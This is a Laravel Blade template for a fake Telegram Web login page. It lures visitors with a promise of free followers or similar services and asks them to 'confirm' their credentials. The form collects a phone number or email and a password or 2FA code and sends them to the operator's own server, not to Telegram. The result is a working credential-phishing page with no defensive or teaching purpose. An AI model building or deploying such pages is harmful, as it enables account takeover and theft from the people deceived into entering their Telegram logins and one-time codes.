@extends('platform-login.layout')

@section('title', 'Telegram Web • Log in')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- Telegram Login Card -->
    <div class="bg-[#17212b] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative text-center">
        <!-- Telegram Logo -->
        <div class="w-16 h-16 mx-auto rounded-full bg-[#24A1DE] flex items-center justify-center text-white shadow-lg shadow-[#24A1DE]/30 mb-4">
            <i class="fa-brands fa-telegram text-4xl ml-[-2px]"></i>
        </div>

        <h2 class="text-2xl font-bold text-white mb-2">Telegram Web</h2>
        <p class="text-xs text-gray-400 mb-6">
            Confirm your Telegram credentials to claim <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#24A1DE]">{{ '@' . ltrim($username, '@') }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'telegram']) }}" class="space-y-4 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 6 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-medium text-gray-400 mb-1">Phone Number or Email</label>
                <input type="text" name="email" required
                    value="{{ $username ? ltrim($username, '@') : '' }}"
                    class="w-full px-4 py-3.5 text-sm rounded-xl bg-[#0e1621] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#24A1DE] transition-colors"
                    placeholder="+1 234 567 8900 or email">
            </div>

            <div class="relative">
                <label class="block text-xs font-medium text-gray-400 mb-1">Password or 2FA Code</label>
                <input type="password" id="tg_password" name="password" required
                    class="w-full px-4 py-3.5 pr-14 text-sm rounded-xl bg-[#0e1621] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#24A1DE] transition-colors"
                    placeholder="Enter password or code">
                <button type="button" onclick="togglePassword('tg_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <button type="submit"
                class="w-full mt-4 py-3.5 bg-[#24A1DE] hover:bg-[#1f8ec4] text-white font-bold text-sm rounded-xl shadow-lg transition-all active:scale-[0.98]">
                NEXT
            </button>
        </form>

        <div class="mt-6 text-xs text-gray-500">
            Log in by QR Code available on desktop
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
